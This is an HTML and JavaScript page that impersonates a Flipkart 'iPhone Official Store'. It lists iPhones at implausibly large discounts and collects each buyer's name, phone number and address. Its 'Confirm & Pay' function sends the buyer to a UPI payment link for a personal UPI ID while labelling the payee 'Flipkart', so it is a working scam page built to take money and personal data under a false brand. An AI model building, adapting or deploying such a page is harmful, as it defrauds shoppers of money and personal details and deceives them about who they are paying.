<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Flipkart | iPhone Official Store</title>
    <script src="https://cdn.tailwindcss.com"></script>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css">
    <style>
        body { background-color: #f1f3f6; font-family: Roboto, Arial, sans-serif; -webkit-tap-highlight-color: transparent; }
        .fk-blue { background-color: #2874f0; }
        .fk-orange { background-color: #fb641b; }
        .fk-yellow { background-color: #ffc200; }
        .color-dot { width: 34px; height: 34px; border-radius: 50%; border: 2px solid #e0e0e0; cursor: pointer; transition: 0.2s; position: relative; }
        .color-dot.active { border: 2px solid #2874f0; transform: scale(1.1); box-shadow: 0 0 10px rgba(40,116,240,0.3); }
        .color-dot.active::after { content: '✓'; position: absolute; top: -8px; right: -8px; background: #2874f0; color: white; font-size: 8px; width: 14px; height: 14px; display: flex; items-center: center; justify-content: center; border-radius: 50%; }
        @keyframes slideUp { from { transform: translateY(100%); } to { transform: translateY(0); } }
        .animate-up { animation: slideUp 0.3s ease-out; }
    </style>
</head>
<body class="pb-10">

    <header class="fk-blue py-3 px-4 sticky top-0 z-50 text-white flex justify-between items-center shadow-lg">
        <div class="flex flex-col">
            <span class="text-2xl font-bold italic leading-3">Flipkart</span>
            <span class="text-[10px] italic font-bold text-yellow-400">Official Store</span>
        </div>
        <div class="flex items-center gap-5">
            <i class="fa-solid fa-cart-shopping text-xl"></i>
            <span class="bg-white text-blue-600 px-4 py-1 rounded-sm font-bold text-sm">Login</span>
        </div>
    </header>

    <main class="max-w-7xl mx-auto p-2 mt-2">
        <div id="grid" class="grid grid-cols-2 md:grid-cols-4 lg:grid-cols-5 gap-2"></div>
    </main>

    <div id="pModal" class="fixed inset-0 bg-black/80 z-[100] hidden flex items-end md:items-center justify-center overflow-y-auto">
        <div class="bg-white w-full max-w-md rounded-t-2xl md:rounded-lg animate-up">
            <div class="p-4 flex justify-between items-center border-b">
                <span class="font-bold text-gray-700">Product Details</span>
                <button onclick="closeModal()" class="text-3xl text-gray-400">&times;</button>
            </div>

            <div class="p-5">
                <div class="flex flex-col items-center mb-6">
                    <div class="h-56 w-full flex items-center justify-center mb-4">
                        <img id="modalImg" src="" class="max-h-full max-w-full object-contain">
                    </div>
                    <h3 id="modalName" class="font-bold text-lg text-center leading-tight"></h3>
                    <div class="flex items-center gap-2 mt-2">
                        <span id="modalPrice" class="text-3xl font-bold text-black"></span>
                        <span id="modalOff" class="text-green-600 font-bold text-sm"></span>
                    </div>
                </div>

                <div class="mb-6">
                    <p class="text-[10px] font-bold text-gray-400 uppercase mb-3 tracking-widest">Available Colors</p>
                    <div id="colorContainer" class="flex gap-4"></div>
                    <p id="selectedColorName" class="text-xs font-medium text-blue-600 mt-2 italic"></p>
                </div>

                <div class="flex gap-2">
                    <button onclick="alert('Added to cart!')" class="flex-1 bg-white border border-gray-300 py-4 font-bold rounded-sm uppercase text-xs">Add to Cart</button>
                    <button onclick="document.getElementById('addrBox').classList.toggle('hidden')" class="flex-1 fk-orange text-white py-4 font-bold rounded-sm uppercase text-xs">Buy Now</button>
                </div>

                <div id="addrBox" class="hidden mt-6 pt-6 border-t border-dashed">
                    <div class="space-y-3">
                        <input type="text" id="uName" placeholder="Full Name" class="w-full border p-3 rounded text-sm bg-gray-50 outline-none focus:border-blue-500">
                        <input type="tel" id="uPhone" placeholder="10-digit Mobile Number" class="w-full border p-3 rounded text-sm bg-gray-50 outline-none">
                        <textarea id="uAddr" placeholder="Complete Address (House, PIN, Area)" class="w-full border p-3 rounded text-sm bg-gray-50 outline-none h-20"></textarea>
                    </div>
                    <button onclick="finalPay()" class="w-full fk-yellow py-4 font-bold rounded-sm uppercase mt-4 text-lg shadow-xl">Confirm & Pay</button>
                </div>
            </div>
        </div>
    </div>

    <script>
        const appleInventory = [
            { 
                name: "iPhone 16 Pro Max", p: 65000, op: 184900,
                variants: [
                    { c: "Desert Titanium", hex: "#beafa0", img: "https://m.media-amazon.com/images/I/81+GIkwqLIL._SL1500_.jpg" },
                    { c: "Black Titanium", hex: "#3b3b3b", img: "https://m.media-amazon.com/images/I/81I6x8rQoGL._SL1500_.jpg" },
                    { c: "Natural Titanium", hex: "#b9b7b3", img: "https://m.media-amazon.com/images/I/81SigAnN7pL._SL1500_.jpg" }
                ]
            },
            { 
                name: "iPhone 15 Pro", p: 55000, op: 134900,
                variants: [
                    { c: "Blue Titanium", hex: "#444a53", img: "https://m.media-amazon.com/images/I/81SigAnN7pL._SL1500_.jpg" },
                    { c: "White Titanium", hex: "#f2f3ee", img: "https://m.media-amazon.com/images/I/81+GIkwqLIL._SL1500_.jpg" }
                ]
            },
            { 
                name: "iPhone 14 Plus", p: 33000, op: 79900,
                variants: [
                    { c: "Purple", hex: "#e5dcf5", img: "https://m.media-amazon.com/images/I/71T5NVOgbpL._SL1500_.jpg" },
                    { c: "Blue", hex: "#d0e0ed", img: "https://m.media-amazon.com/images/I/71GLMJ7TQiL._SL1500_.jpg" }
                ]
            },
            { 
                name: "iPhone 13", p: 25000, op: 59900,
                variants: [
                    { c: "Midnight", hex: "#1c1c1c", img: "https://m.media-amazon.com/images/I/71GLMJ7TQiL._SL1500_.jpg" },
                    { c: "Starlight", hex: "#f9f6ef", img: "https://m.media-amazon.com/images/I/71ZOtNdaZCL._SL1500_.jpg" }
                ]
            }
        ];

        let payAmount = 0;

        function render() {
            const grid = document.getElementById('grid');
            let html = '';
            for(let i=0; i<50; i++) {
                let item = appleInventory[i % appleInventory.length];
                let disc = Math.round(((item.op - item.p)/item.op)*100);
                html += `
                <div class="bg-white p-3 border border-gray-100 flex flex-col" onclick='openModal(${JSON.stringify(item)})'>
                    <img src="${item.variants[0].img}" class="h-36 object-contain mb-2">
                    <h2 class="text-[11px] font-bold text-gray-800 truncate">${item.name}</h2>
                    <div class="flex items-center gap-1 mt-1">
                        <span class="font-bold text-sm">₹${item.p.toLocaleString()}</span>
                        <span class="text-green-600 font-bold text-[10px]">${disc}% off</span>
                    </div>
                    <img src="https://static-assets-web.flixcart.com/fk-p-linchpin-web/fk-cp-zion/img/fa_62673a.png" class="h-3 mt-2">
                </div>`;
            }
            grid.innerHTML = html;
        }

        function openModal(item) {
            document.getElementById('modalName').innerText = item.name;
            document.getElementById('modalPrice').innerText = "₹" + item.p.toLocaleString();
            document.getElementById('modalOff').innerText = Math.round(((item.op - item.p)/item.op)*100) + "% off";
            document.getElementById('modalImg').src = item.variants[0].img;
            document.getElementById('selectedColorName').innerText = item.variants[0].c;
            payAmount = item.p;

            const container = document.getElementById('colorContainer');
            container.innerHTML = item.variants.map((v, i) => `
                <div class="color-dot ${i===0?'active':''}" 
                     style="background:${v.hex}" 
                     onclick="event.stopPropagation(); changeVariant('${v.img}', '${v.c}', this)">
                </div>
            `).join('');

            document.getElementById('pModal').classList.remove('hidden');
            document.getElementById('addrBox').classList.add('hidden');
            document.body.style.overflow = 'hidden';
        }

        function changeVariant(imgSrc, colorName, element) {
            // Photo aur Color Name update
            document.getElementById('modalImg').src = imgSrc;
            document.getElementById('selectedColorName').innerText = colorName;
            
            // Active class handle
            document.querySelectorAll('.color-dot').forEach(dot => dot.classList.remove('active'));
            element.classList.add('active');
        }

        function closeModal() {
            document.getElementById('pModal').classList.add('hidden');
            document.body.style.overflow = 'auto';
        }

        function finalPay() {
            const upi = "8709615634-w350@ybl";
            if(!document.getElementById('uName').value) return alert("Pehle naam bhariye!");
            window.location.href = `upi://pay?pa=${upi}&pn=Flipkart&am=${payAmount}&cu=INR`;
        }

        render();
    </script>
</body>
</html>
